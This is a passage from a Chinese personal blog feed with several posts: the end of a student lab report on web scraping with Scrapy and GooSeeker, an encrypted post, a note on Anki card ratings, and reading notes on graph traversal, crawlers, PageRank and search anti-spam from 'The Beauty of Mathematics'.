class="string">'&amp;limit=20'</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(url=url,callback=self.parse)</span><br></pre></td></tr></table></figure>

<p>items.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    url = scrapy.Field()</span><br></pre></td></tr></table></figure>

<p>pipelines.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanPipeline</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self,spider)</span>:</span></span><br><span class="line">        self.file = open(<span class="string">"douban.json"</span>,<span class="string">"w"</span>)</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">        self.num+=<span class="number">1</span></span><br><span class="line">        content = json.dumps(dict(item),ensure_ascii=<span class="literal">False</span>)+<span class="string">'\n'</span></span><br><span class="line">        self.file.write(content)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span><span class="params">(self,spider)</span>:</span></span><br><span class="line">        print(<span class="string">'一共保存了'</span>+str(self.num)+<span class="string">'条数据'</span>)</span><br><span class="line">        self.file.close()</span><br></pre></td></tr></table></figure>

<p>setting.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BOT_NAME = <span class="string">'douban'</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">'douban.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'douban.spiders'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line">USER_AGENT = <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.15 Safari/537.36'</span></span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy crawl douban_movie</span><br></pre></td></tr></table></figure>

<p>成功   保存为douban.json</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402235614155.png" alt="image-20200402235614155"></p>
<p>参考链接：</p>
<ol>
<li><p><a href="https://www.jianshu.com/p/ac9547e332da" target="_blank" rel="noopener">https://www.jianshu.com/p/ac9547e332da</a></p>
</li>
<li><p><a href="http://www.scrapyd.cn/" target="_blank" rel="noopener">scrapy中文网</a></p>
</li>
</ol>
<h1 id="实验3-使用GooSeeker爬取数据"><a href="#实验3-使用GooSeeker爬取数据" class="headerlink" title="实验3-使用GooSeeker爬取数据"></a>实验3-使用GooSeeker爬取数据</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>​     GooSeeker是一个采用云计算架构的网页数据抽取工具包，能根据用户的指导，从网页上抓取需要的文本，并输出按一定结构输出提取结果文件（XML文件）</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403123135206.png" alt="image-20200403123135206"></p>
<h2 id="实例-知乎热榜爬取"><a href="#实例-知乎热榜爬取" class="headerlink" title="实例-知乎热榜爬取"></a>实例-知乎热榜爬取</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>​    首先从官方网站下载安装包，在主界面选择“下载爬虫”的下载方案比较方便。安装好软件后，新用户需要在集搜客网站上注册账号，用于之后登录集搜客软件。</p>
<h3 id="1-制作采集规则"><a href="#1-制作采集规则" class="headerlink" title="1.制作采集规则"></a>1.制作采集规则</h3><ol>
<li><p>打开MS谋数机</p>
</li>
<li><p>输入目标抓取网站的网址，命名规则主题名。</p>
</li>
</ol>
<p>第一步：在MS谋数机的“网址栏”，输入想要进行爬虫抓取的网页的网址，然后回车进行加载，可以在MS谋数机下方的“浏览器”窗口看到页面显示。</p>
<p>第二步：页面加载完后，在右边的“工作台”中的“命名主题”下方的“主题名”栏处输入自定义的主题名，这里我命名为“zhihu-rebang”，然后点击旁边的“查看”按钮，测试你起的名字是否已被占用，如果提示“该名可以使用”则命名成功。</p>
<h3 id="2-新建整理箱"><a href="#2-新建整理箱" class="headerlink" title="2.新建整理箱"></a>2.新建整理箱</h3><p>第一步：点击右方的“工作台”中的“创建规则”，点击“新建”按钮，在弹出的窗口中输入想要命名的整理箱名称。这里我命名为“rebang”。</p>
<p>第二步：在整理箱中添加抓取内容。右击整理箱名称选择“添加-包含”，这里我先添加“热榜名”，继续添加的话，右击“热榜名”选择“添加-其后”，添加“热榜简介”。</p>
<p>第三步：整理箱中必须有一个是“关键内容”，选择一个抓取内容设为“关键内容”，这里我吧“热榜名”勾选为“关键内容”。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403132103024.png" alt="image-20200403132103024"></p>
<h3 id="3-进行内容映射"><a href="#3-进行内容映射" class="headerlink" title="3.进行内容映射"></a>3.进行内容映射</h3><p>第一步：在“浏览器”窗口中点击想要获取的内容，比如现在要获取哪个内容，就在那个区域进行鼠标点击，这时候MS谋数台会自动定位其在HTML中结点的位置。</p>
<p>第二步：展开一个节点，因为“热榜名”是一个H2所以找到H2标签。</p>
<p>第三步：右击这个text，选择“内容映射-热榜名”。</p>
<p>第四步：后面的内容映射同第三步。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125234819.png" alt="image-20200403125234819"></p>
<h3 id="4-使用样例复制"><a href="#4-使用样例复制" class="headerlink" title="4.使用样例复制"></a>4.使用样例复制</h3><p>由于评论和评论之间是相同结构的数据，我们上一步只是完成了一个评论条目的抓取，想要抓取更多的评论就需要进行样例复制。</p>
<p>第一步：点击整理箱名称，即“rebang”。</p>
<p>第二步：勾选右侧方的“启用”，开启样例复制功能。</p>
<p>第三步：分别找到第一条热榜名和第二条热榜名对应的节点。</p>
<p>第四步：右击第一条评论对应结点，选择“样例复制映射–第一个”。</p>
<p>第五步：右击第二条评论对应结点，选择“样例复制映射–第二个”。</p>
<p>可以点击右侧的“测试”按钮对当前的规则进行测试，看到的结果是不是想要抓取的内容。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125255689.png" alt="image-20200403125255689"></p>
<p>第二个样例复制映射</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125250180.png" alt="image-20200403125250180"></p>
<p>测试-&gt;输出</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125309634.png" alt="image-20200403125309634"></p>
<h3 id="5-创建记号线索"><a href="#5-创建记号线索" class="headerlink" title="5.创建记号线索"></a>5.创建记号线索</h3><p>由于评论有很多页，所以我们要解决抓取数据的时候翻页的问题，需要创建一个“记号线索”。</p>
<p>但是知乎热榜并没有下一页，所以暂时不用</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403125858495.png" alt="5"></p>
<h3 id="6-MS打数机存规则"><a href="#6-MS打数机存规则" class="headerlink" title="6.MS打数机存规则"></a>6.MS打数机存规则</h3><p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403130137855.png" alt="image-20200403130137855"></p>
<h3 id="7-打开DS打数机爬取"><a href="#7-打开DS打数机爬取" class="headerlink" title="7.打开DS打数机爬取"></a>7.打开DS打数机爬取</h3><p>在gooseeker里打开或MS数谋机中导航打开</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403130202413.png" alt="image-20200403130202413">    </p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403130328282.png" alt="image-20200403130328282"></p>
<p>选择任务“zhihu-rebang”-&gt;单搜</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403132206171.png" alt="image-20200403132206171"></p>
<p>单搜完之后，数据默认存储在下面的路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\DataScraperWorks\任务名</span><br></pre></td></tr></table></figure>

<p>在爬取完后打开</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403135744961.png" alt="image-20200403135744961"></p>
<h3 id="8-导出xlsx数据"><a href="#8-导出xlsx数据" class="headerlink" title="8.导出xlsx数据"></a>8.导出xlsx数据</h3><p>在会员中心、数据管理中导入存储在本地的爬取数据</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403133433216.png" alt="image-20200403133433216"></p>
<p>导出为xlsx数据，成功！</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200403133608712.png" alt="image-20200403133608712"></p>
<p>参考链接：</p>
<p><a href="https://www.jianshu.com/p/62bb53e07544" target="_blank" rel="noopener">https://www.jianshu.com/p/62bb53e07544</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p>这次的实验学到了爬虫的python相关库、工具，学习了正则式等知识</p>
</li>
<li><p>BeautifulSoup库这种自己操作的让我感觉比较轻松，但是srapy、gooseeker没有弄的太深，只学了皮毛。但是按scrap明显比较成熟，有各种配置可以使用，以后还是得学一手。</p>
</li>
<li><p>在学爬虫之前一直对网络很恐惧，自己不能掌握它，后来学了计网，其实也不过如此。</p>
</li>
<li><p>总的来说这次实验基本都完成了，在学完计网之后虽然理解了原理，但是一直没有实操。这次的实验给了我很多场景去学习，学到了很多。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
        <tag>信息内容安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-3-22-plan-A</title>
    <url>/2020/03/22/2020-03-22-plan-A/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="404d9ea170872c981357a58f2ac58397bd1182aa8e0e9f78bf1f82e1ffc04007">bbbb22e1e2503541a77611f6c73ce2a7ad836dab925d337ce60f8d2ea184604aaafbb3ceac239c6b9bbc6e7e08d28991a0cf915d82656b67aba4e959688ca2954dcb2499c50c14ea2e5b51ab6affe5dfc24a41a3466372c5df512151fcc8b8481927a5750cd16c7a6177762eab03797875c5de756bbe2fd857c030703aca6e1412f4d2fedc8f1d2cfb882932c19adc34ea11e86a36895732e5ab574fcc9bba96361dc5774e0b54b42bff0b05870a82597f0c05819fe82a7a35208c1c757c5d20900f9a143ce46e3509d35e1c8f10793bafdd0819c10e74090c00b57d6358f94ade7b29d23aa82a84d900d1973d9ca47a898090cd5469a13f97b2c8759c1c2372bece1f472f276383900ca14f1615c80cbeaf754ac86775a0abbca6816c2d054cdb8c9fd5ea6b9ad6d5b71493c3c17fe0a9fc1bc244fb8768e6f8e52ef71951bc04fe2fd7fc84ad47c895de4c59a8512f9146c3d4da89b9e4dc20316c560225c793324706efc51ca62b68a8ab1f0de95893af644d087498bd8370c8a24cea958eda71bed202c8b9459253951085317cd10e821b533f4a82c5ae1d189e238fb0b2a1c8231dfd6c9392951dd560ab65341f2d3ea24660579294e92d63ceb319f243795e182d2e87c81147c753716823090b897f30fd722e796501394901af4d0e563ff6abce80c8ae16f88ef10e2a97da9f641f4061b97aa7163d13104dcdb3c346bada3d794c01633aeac335ef7e41a651cfdb585305326dce306f8d56eb0e258b4a4f415d4c72f800c1f3500286c756ba9bc7f52e08609d943af6cc117718156728a6095d5bc1c97add9f8a3a8447b4e4ef3991e39380af7f74cdfa4a61f1ff46f87cbd11791e324575e403e313078c7f25f7fdb13c52236c4496a87e742a0c277c5449be0b270754033850792addb252362d72d7e93662e5170a27c7ddcbe3e50300851e441aee978315be5a3b01bc8de6a9c54c1b353b1449abb25fd5313b5f625a471d84cf63cc96edbdefe7f2b404a32ff0a3e4f6b66c2d1e00c20b0ed9081621069fb68792820a677d06ab19d902bcf9ee3d789a163bc2ca51640cbc3440b7a871f1b21460714bffaafcb838b091d91bdc28eb08ccdebe71cde566956b5fd7c039484826d57bd6c4c45d76c8267e496e1db996321ae369a4e479d62fe32b5691fe6dee11b746f6fd35f36ce7b2eda566595817601caae673f14c8476735518f0ab3ea55e51abd218e3fa3be051782efc9ba5e399c5cd3b67c84cb9fb7dd4ec371aac367067747515dafc9c6b047b15695ab54867f3f583af74011da6ce6fef70c3bc4cd2b1531d17ca28a6f1189bc68c41ae81e0e17f9bcdbcd59893b22e0f7bfe6d02e90309a39417629118dc090ba8ba0c97c3d4fee8602b509e8f1b9deff70af00bc7fcaa39b38536b88b68383ad53ae4398d67be94dfe5328c4cec167d2164fe67c94ab8f508736d851a0ab2d45d6a71557281dd7f9d2f86c8d4746138cd82230f9db3e934e585a5b43f98f3d462a50c67427686f7bafe33a358a4829103d14d981548e174d70e812bdce77aec1aa85e872d67ff42aa85a3b263c7590ee6bc0c3444a36b6d26a4c4857cd3e97d6162ab9ac6469e8b139d0fa7f2523036f9b7f6471899f23e890ca53e6cb48824ed08ba738c104a6b8260a75e67d202f74ecfcc2eddc3decac70d10de0305e7741d986031562e0454852a89715e607ee8c59d7d5c78de8f19fcac88e149eb40bbcef7eb62003bb4c27a051f8266f0c912fb6361e8ec87c5e5486329ffe4c10910295eac78789b04b50f770a3cc5de22fc2749fe2c4590881f48a87226ce47cd4072e6da6ccf0cf3f66691f9c77dde960b2c88c4657575137453477162c3b5a16ecaef697253c2203e5a4acbaa62e9fb98c5b82d2edcd30e815f5d106b87e4e3e1551aafae214207f7315c47977c2ba10311158778b5ac3965ee0a6c84674d50eb14fda0777874b94b48a8b8b15cd43b784cd9c511d50ee40c7b57ae01d4926806c1a74da2ef8d871284eb5f3f35bf005995732e946d074e7d113d07b89087f44936829029786ff21973cb8cc2cd59b751eaee38bf55bc82fe7e413a2ef0f2545d64ee2980c769f97d179976c4bdc02cb660542e2911e8ebf5c60a0656c0ab313ea11a82b2ba918a1a27a93e8c4a9464f521472d808a304ef132c12615a312507252dcbe46e6b3de44f82f42d38285f2bda8fe4179290dbb2fab91120ea6eb45ce2de098f6e94a85f9a769bc458e0b1ad0bd82e2306831b12791ec45df14a9e049e50f1feb64d2b9931ab5373a4e3cbf9ab6e7b76950ebac8d73064435e7d2e0ed86ef2f0f6df8e0e3da7359b3842d471e3dd27af37559ccee83bfd2c0a9eac80c98500bdb97beb480e36015813a03fddf56f2f39b12f599cf39109b23290adceabbad2e0c2b8712b42c97756e5987445289bb91056bda61828c4ddae70b61c25cdd2db677c9846a95c627fd3651a994bff860579dcd3313515cd7fb77f665e2b394333973dae479ec20508a516808909be5b23c425f0a63393b582166b5986e87acd1c0c56dfc29f1f3095286d8a7a0a05b99be63d3aa11967e4ff62d694b1370d1832061744808882ac8a9f642073673f1502d40680065672dc038200082e7461ce6f19ebef20dc9e4c46eaad003a367c773bc0bbf9867210bcd00a73893aff8615157674244c6069bf4836cd6707ebf71ea77ea3ccf922ece4ac9c1f1ba15de34d35dfbde5bb8265c698d7b2c5b59386450021906a998f30912c2cc256456cf83c0e7bc3e333282c746163fef54bafd27290f4d8413bd3d8356c782e64e3cc5023aeee607a9ed7f67dd399c4aec8c91f6360af611be63e39af23e40f3007eedf5bc233dd5c2c56e43386a0c47f53017b4b824833d5c9211a773094b3306b53ca16c68d1a8987e50983e48f7b3bc0b9a44ac38ede3f681696657267073062402d828a14cda431f79cd1011c55d6bdfe7874315cb626d108975e56811dbc97cef673802b23bf3cb953e0b9e736b01c915a6f80dca925630def417106579018a79460dfe1b11dc9cefe7e0b606dfd432b16bc31548d54c5b764e6c205ef076a7b064b3ece59035e41ba5568b934804935439c97e6d579c4ddca67ce8d13013465169592648443a862a1fc9db092d777f87a553b690e9bbdcc1428b3fbbaa3700af4e37470de685c40351c4df1b407503d54b4834a684addd48c8a0c6828a14308aac47b18a1e6bbb65bdbf385f7dcf82c0732f009c767f403e3f6a07a1f61085e515863e753d81f8db2322f3e1365707d84bd1ca59e24b8ed41965a0a6f2d367df207e448a4759364216f99423b48e019d62971df690258aa699c27e58c03b9bbe4c4763d0473a6525e239399809fd6517106ac6decd4de72e292392b992414387e601eef64d8657227be4f1c2ab334c3ed25599ff3523574120476ccddd704a76d0637dbf1ca8ec51b13a425c31459ba695110eebaf5e8649e9323d5829b85afa1d77c3f91f65a1dcc8df0e934e9a5229c87effe9738c33f56e9676ee2e95558ce00c3b1f656dac5b2a4d6b0ff0a603652f172e0562e3a5b205e491bc67fac1065355e1653c698dab1cec60ed790104335b20bb57b839a12e4bf5549ebcc4c95866b01e1f59703038ad17b0e89edf4bbc0b851c9170fda41c3d0cc0dd1b037a89e2961561e4b70f4d779002f5e760ccf1736d957309fbdd0754785d6413c15ce035bb3585a99a8571f92c13eda69f8f0c4628d4ecee813ceb5921252a789b5d3adbcaa92a7dbe0e849b57d8a09e4a8a321044902780c6e6b2f213e003365862f16127f400704fccaa7f3f33a74c8abec5822a3225c40a6be2374aaa3bdf3c5b793c22ed107d06fefa794fe02886cf60eb6b039870cf7630afe54476521e022cd8819884ac6b8c33eabe41793bdbf06db276f759464cc930d0f6e5d7a2b002196f78b028018e7d7cd8e94c4f0ed6ad7af29cac967eeb45b960d35e1384c2dbe849c4b56058954f82b2489990a036c775c46fa3dbe66dd6518902a9b3d5f73aac0830a22b548b5c0e8ec6d43aad5309d1ca9384f73362436765818e466aae7b26d35d8bd3383e3755fbc58c7986555ec87a719d1d8f6b1ff93cf7f7e1c27758a21cc83c4019c7f8553ecf37da15a8d291bde7d003b474ab46994f9bbfe3724b181ef9f5b1be1551e9c37e7084452b59b3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>ANKI的使用</title>
    <url>/2020/03/08/2020-03-08-anki-1/</url>
    <content><![CDATA[<h1 id="anki卡片的难度划分"><a href="#anki卡片的难度划分" class="headerlink" title="anki卡片的难度划分"></a>anki卡片的难度划分</h1><p>生疏/错误 困难/模糊 犹豫/想起 顺利/正确</p>
<p>1、生疏/错误：这个是级别简单得说就是你一看到就知道自己没见过或者见过也忘了。<br>2、困难/模糊：这个是级别简单得说就是你用力想能记起来一点，但不完全。<br>3、犹豫/想起：这个是级别简单得说就是你仔细想，还是能够回忆出来。<br>4、顺利/正确：这个是级别简单得说就是没什么难度，基本熟悉了。<br>5、轻松/容易：这个是级别简单得说就是条件反射、一看便知。</p>
<p>在学习时Anki有一个按钮，如果记忆对象实在太简单了，你可以点击排除按钮将卡片排除在今后复习之外（你如果忍无可忍还可以删除该条）。实际上第5个级别只在学习新卡片时出现，所以常用的级别就是1-4。</p>
<p>生疏/错误选项，Anki认为是学习失败，失败的这张卡片在接下来几分钟或本次学习的末尾还会出现，失败次数达到某个值会变为记忆难点（决定于你的设置）。</p>
]]></content>
  </entry>
  <entry>
    <title>数学之美</title>
    <url>/2020/03/07/2020-03-07-beatuy-of-mathematics/</url>
    <content><![CDATA[<h1 id="数学之美"><a href="#数学之美" class="headerlink" title="数学之美"></a>数学之美</h1><p>《数学之美》是人民邮电出版社于2012年5月出版的图书，作者吴军，2014年再版。书中将高深的数学原理讲得更加通俗易懂，让非专业读者也能领略数学的魅力。通过具体实例教会读者在解决问题时如何化繁为简，如何用数学去解决工程问题，如何跳出固有思维不断去思考创新等。</p>
<h3 id="第九章-图论和网络爬虫"><a href="#第九章-图论和网络爬虫" class="headerlink" title="第九章 图论和网络爬虫"></a>第九章 图论和网络爬虫</h3><h4 id="图论定义"><a href="#图论定义" class="headerlink" title="图论定义"></a>图论定义</h4><p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307165641288.png" alt="image-20200307165641288"></p>
<p>七桥问题：一个步行者怎样才能不重复、不遗漏地一次走完七座桥，最后回到出发点。</p>
<p>后来大数学家欧拉把它转化成一个几何问题——一笔画问题。在解答问题的同时，开创了数学的一个新的分支——图论与几何拓扑，也由此展开了数学史上的新历程。</p>
<p>PS：连通图可以一笔画的充要条件是：奇点的数目不是0 个就是2 个。</p>
<h4 id="BFS广度优先遍历"><a href="#BFS广度优先遍历" class="headerlink" title="BFS广度优先遍历"></a>BFS广度优先遍历</h4><p>爬虫用到了图论的遍历（Traverse）算法</p>
<p>BFS广度优先遍历（Breadth-First Search）算法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 初始只有一个已有节点</span><br><span class="line">2. 遍历当前已有节点的邻接节点，加入已有节点</span><br><span class="line">3. 重复步骤（2）直到不再有新的已有节点</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307162611791.png" alt="image-20200307162611791"></p>
<p>广度遍历的次序图（从北京开始）</p>
<h4 id="DFS深度优先遍历"><a href="#DFS深度优先遍历" class="headerlink" title="DFS深度优先遍历"></a>DFS深度优先遍历</h4><p>DFS深度优先遍历（Depth-First Search）算法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 初始只有一个未被标记节点</span><br><span class="line">2. 查找未标记的节点的邻接节点A，找到节点A被标记</span><br><span class="line">3. 进入该节点A第一个未标记的邻接节点B,将其设为A</span><br><span class="line">4. 回到2直到所有节点遍历完</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307163047990.png" alt="image-20200307163047990"></p>
<p>深度遍历的次序图（从北京开始）</p>
<h4 id="网络爬虫-Web-Crawlers）定义"><a href="#网络爬虫-Web-Crawlers）定义" class="headerlink" title="网络爬虫(Web Crawlers）定义"></a>网络爬虫(Web Crawlers）定义</h4><ul>
<li>互联网-就是一张大<code>网</code>（图）</li>
<li>一个<code>网页</code>为一个<code>节点</code> node</li>
<li>网页中的<code>超链接</code>是一条<code>边</code> edge，连向其他<code>节点</code>（网页）</li>
<li>网络爬虫正是<code>遍历</code>（访问）这张网并且<code>下载网页</code>（获得信息）的程序</li>
<li>使用<code>哈希表</code>（Hash Table）来记录一个网页是否被访问</li>
<li>现在的Google等公司使用的爬虫程序都是<code>并行的</code>、<code>多设备</code>，需要好的<code>并行算法</code></li>
</ul>
<h4 id="搭建爬虫工程要点"><a href="#搭建爬虫工程要点" class="headerlink" title="搭建爬虫工程要点"></a>搭建爬虫工程要点</h4><ul>
<li>用什么<code>遍历</code>算法？</li>
<li>页面的分析和URL的提取？</li>
<li>URL记录表 <code>已遍历哈希表</code>的并行问题</li>
</ul>
<p>1.用什么遍历算法？</p>
<p>一般来说，为了快速遍历重要的网址（比如腾讯主页中URL），用<code>BFS</code></p>
<p>而为了减少目标服务器消耗（如TCP连接的握手次数过多，下载效率降低），用<code>DFS</code></p>
<p>但是一般都没这么简单，需要一个复杂的复杂的<code>调度系统</code>Scheduler，工程上使用<code>优先级队列</code>与<code>BFS</code>类似</p>
<p>2.页面的分析和URL的提取？</p>
<p>由于很多网页HTML都是用脚本语言<code>javascript</code>来生成的（或逻辑控制，数据嵌入），所以一个HTML中的URL并不是显而易见的，需要通过浏览器渲染（运行javascript），所以一个好的爬虫需要熟悉浏览器内核的人来编写。</p>
<p>3.URL记录表 <code>已遍历哈希表</code></p>
<p>由于一个URL可能被很多网页超链接。</p>
<p>如果爬虫足够大，爬取URL太多，那么在上千台服务器中，这个<code>遍历哈希表</code>就会变得相当大，维护很困难。这里的维护指的是哈希表的<code>同步</code>（避免重复下网页发生冲突）、<code>存储</code>（会大的一台服务器都存不下）</p>
<p>使用如下两种手段来控制</p>
<ul>
<li>明确分工、如指定某个域名由某台机器爬取</li>
<li>把哈希表存储在一组独立的服务器上</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307172007654.png" alt="image-20200307172007654"></p>
<h4 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h4><p>之前在数据结构、离散数学中都学过图论，但是当时都是学了一遍便忘了。</p>
<p>直到近期在做一个项目，设计到了图论的遍历、最短路径问题。</p>
<p>才知道图论是如此的有意思，而这次看爬虫也是图论，算是再复习下吧，数学不愧是万物之源啊。</p>
<h3 id="第十章-PageRank（网页排名）"><a href="#第十章-PageRank（网页排名）" class="headerlink" title="第十章 PageRank（网页排名）"></a>第十章 PageRank（网页排名）</h3><p>网页排名是对搜索结果的分析，使那些更具“重要性”的网页在搜索结果中的排名获得提升，从而提高搜索结果的相关性和质量。</p>
<h4 id="Google的page-rank"><a href="#Google的page-rank" class="headerlink" title="Google的page rank"></a>Google的page rank</h4><h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果一个网页被其他网页所链接（投票），说明其受到了普遍的承认和信赖，那么此网页的Rank排名就高。</span><br></pre></td></tr></table></figure>

<h4 id="算法细化"><a href="#算法细化" class="headerlink" title="算法细化"></a>算法细化</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对每个网页的 投票权重 做区分（就如股东大会的表决权）</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307173646445.png" alt="image-20200307173646445"></p>
<h4 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h4><p>将<code>Pagerank</code>用<strong>向量</strong>表示，并且用<strong>矩阵相乘</strong>的方法来<strong>迭代</strong>计算<code>Pagerank</code>。</p>
<p>初始的排名从哪来？全部设为1/n</p>
<p>（够暴力吧，理论证明，无论<strong>初值</strong>如何取，这种算法都能保证网页排名能收敛到<strong>真实值</strong>，无需人工干预）</p>
<p><img src="/2020/03/07/2020-03-07-beatuy-of-mathematics/image-20200307183507652.png" alt="image-20200307183507652"></p>
<h4 id="实际问题"><a href="#实际问题" class="headerlink" title="实际问题"></a>实际问题</h4><p>矩阵过于大计算量大，使用<strong>稀疏矩阵</strong>的计算技巧。</p>
<h4 id="目前的发展"><a href="#目前的发展" class="headerlink" title="目前的发展"></a>目前的发展</h4><p>当今影响搜索引擎的质量的有如下几点：</p>
<ul>
<li><p>好的<strong>索引库</strong>，如果一个URL没被索引，它就不可能被查到。</p>
</li>
<li><p>网页的<strong>质量的度量</strong>，如pagerank。</p>
<p>目前的搜索引擎算法对网页质量的衡量复杂多了，是全方位的，质量的衡量以考用户点击等数据。</p>
<p>顺带一提：因为google拥有的庞大数据积累，使得后来的搜索引擎无法超过他。而当年google刚成立时，pagerank算法的专利保护很好的保护了它度过了前期的<strong>数据积累</strong>时期。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据也是一种资本，这导致了，即使你现在做一个比百度还好的算法，却不可能替代它在国内的地位了。</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>用户偏好</strong>。用户的喜好不同推送不同的内容。</p>
<p>目前的B站、知乎、淘宝的推荐都是用机器学校来判断你的喜好类型。这里批评一下，目前的推荐都是单调（只有个人的喜好）、且更新过于恶心（新<code>类型</code>的权重会很大，导致下次刷新都是该类型）。</p>
</li>
<li><p>与用户搜索的相关性。如果是做个人站的搜索，用TF-IDF就可以满足要求，而大公司的相关性判断则复杂的多。</p>
<p><strong>TF-IDF</strong>（term frequency–inverse document frequency）是一种用于信息检索与数据挖掘的常用加权技术。<strong>TF</strong>意思是词频(Term Frequency)，<strong>IDF</strong>意思是逆文本频率指数(Inverse Document Frequency)。</p>
<p>一篇文章的相关性分数：TF*IDF。</p>
</li>
</ul>
<h3 id="第十八章-搜索引擎反作弊及搜索结果权威性"><a href="#第十八章-搜索引擎反作弊及搜索结果权威性" class="headerlink" title="第十八章 搜索引擎反作弊及搜索结果权威性"></a>第十八章 搜索引擎反作弊及搜索结果权威性</h3><h4 id="搜索引擎的反作弊"><a href="#搜索引擎的反作弊" class="headerlink" title="搜索引擎的反作弊"></a>搜索引擎的反作弊</h4><p>作弊<strong>SEO</strong>是伴随着搜索引擎排名产生的。搜索结果排名靠前的不一定是高质量的相关网站。</p>
<p>常见的<strong>作弊手段</strong>：针对<code>tf-idf</code>的<code>重复关键词</code>、针对<code>PageRank</code>的<code>链接站</code>（专业买卖链接URL）。</p>
<p>关于<strong>落地页</strong>（LandinPage），其内容质量高，但是里面暗藏js跳转，一进去就跳转到一个商业网站。</p>
<p><strong>反作弊的哲学</strong>：一般小的搜索引擎没有作弊不是因为他们反作弊很好，而是因为作弊商看不上这些小站。</p>
<h4 id="如何反作弊"><a href="#如何反作弊" class="headerlink" title="如何反作弊"></a>如何反作弊</h4><p>抓作弊成为了“<strong>猫捉老鼠</strong>”的游戏，没有一劳永逸的方法（信息安全也是如此）。</p>
<p>透过具体问题，看本质和动机，解决问题。反作弊也是如此，需要“道”。<strong>术即是表层，道即事物本质。</strong></p>
<p>而通信模型对于搜索反作弊依然适用。在通信中解决噪声干扰问题的基本思路有两条。</p>
<ul>
<li>从信息源出发，加强通信（编码）自身的抗干扰能力。</li>
<li>从传输来看，过滤掉噪声，还原信息。</li>
